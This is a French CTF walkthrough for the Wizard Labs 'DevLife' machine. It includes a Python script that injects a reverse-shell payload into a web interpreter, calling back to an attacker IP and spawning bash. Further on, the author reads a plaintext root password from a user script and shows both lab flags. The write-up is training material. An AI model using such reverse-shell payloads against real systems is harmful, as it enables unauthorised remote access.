# Solution du CTF DevLife de Wizard Labs

The Meaning of Life
-------------------

Sur ce CTF facile de [Wizard Labs](https://labs.wizard-security.net/) se trouve un site web d'un certain *Teddy Smith* indiquant qu'il travaille sur un interpréteur Python pour le web.  

Du coup on n'est pas trop surpris de trouver ceci à l'URL */dev* :  

![WizardLabs CTF Devlife python interpreter RCE](https://raw.githubusercontent.com/devl00p/blog/master/images/wizard-labs/devlife_interpreter.png)

On remarque vite que l'output des commandes ne nous est pas retourné. Il semble aussi que l'interpréteur a du mal à digérer les double-quotes, peut être le signe d'une injection de commande shell (on peut imaginer un appel du type *python2 -c "your\_payload\_here"*).  

Vu que l'on a du Python, autant s'y tenir. J'ai fait le script suivant pour passer plusieurs lignes au script PHP :  

```python
import requests

backdoor = (
    "import os;"
    "import socket;"
    "import pty;"
    "s=socket.socket();"
    "s.connect(('10.254.0.29',7777));"
    "os.dup2(s.fileno(),0);"
    "os.dup2(s.fileno(),1);"
    "os.dup2(s.fileno(),2);"
    "os.putenv('HISTFILE','/dev/null');"
    "pty.spawn('/bin/bash');"
    "s.close()"
)

response = requests.post(
        "http://10.1.1.20/dev/interpreter.php",
        data={"com": backdoor}
)
print(response.text)
```

Pour le néophyte Python, l'absence de virgules dans la variable *backdoor* n'est pas une typo, juste une façon de rendre plus lisible une longue chaîne.  

man sudoers
-----------

Une fois notre shell obtenu en tant que *www-data* j'ai vite remarqué différents scripts en relation avec *sudo* ou *su* :  

```plain
www-data@Devlife:/var/www/html/dev$ w
 13:38:45 up  2:13,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     tty1     -                11:26    2:10m  0.13s  0.05s nano sudo.py
www-data@Devlife:/var/www/html/dev$ last
tedd     pts/1        10.253.0.158     Sun Dec 23 13:21 - 13:22  (00:01)
root     tty1                          Sun Dec 23 11:26   still logged in
reboot   system boot  4.9.0-7-amd64    Sun Dec 23 11:25   still running
reboot   system boot  4.9.0-7-amd64    Sun Dec 23 11:21   still running
tedd     pts/1        10.254.0.6       Mon Sep 17 16:13 - 16:49  (00:36)
reboot   system boot  4.9.0-7-amd64    Sat Sep 15 21:19   still running

wtmp begins Sat Sep 15 21:19:20 2018
```

Même chose pour l'utilisateur *tedd* (en plus de son flag) :  

```
www-data@Devlife:/var/www/html/dev$ cat /home/tedd/user.txt
529c7a0e511974d8e8761430bb8a12bf93e44406

www-data@Devlife:/home/tedd/.env$ cat su.py

import pexpect
child = pexpect.spawn('su root')
child.expect ('Password:')
child.sendline('teddyxy2019')
child.expect('\$')
child.sendline('whoami')
```

Stockage du mot de passe... mauvaise idée :p  

Les utilisateurs *tedd* et *root* partagent le même mot de passe.  

```plain
root@Devlife:~# cat /root/root.txt
d360adc7e9c5ceb3588a79bd88e3cec7a5d14368
```


*Published April 04 2019 at 18:05*